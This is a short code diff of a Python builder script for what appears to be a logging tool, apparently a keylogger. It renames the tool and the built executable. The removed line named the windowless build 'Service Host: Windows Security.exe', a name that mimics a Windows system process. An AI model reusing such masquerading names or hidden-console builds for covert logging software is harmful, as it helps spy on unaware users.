@@ -4,7 +4,7 @@ from datetime import datetime, timedelta
 from getpass import getpass
 
 BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
-header = ('{0}Absorber{1} > {2}'.format(YELLOW, WHITE, END))
+header = ('{0}Logger{1} > {2}'.format(YELLOW, WHITE, END))
 
 os.system('cls')
 print("""
@@ -107,7 +107,7 @@ elif choice == '5':
     sys.exit()
 
 elif choice == '6':
-    name = 'Service Host: Windows Security.exe'
+    name = 'Logger.exe'
     os.system('rmdir /S /Q dist 2>nul')
     os.system('pyinstaller --noconsole -m Manifest/manifest.manifest -F log.py')
     os.system('rmdir /S /Q build __pycache__')
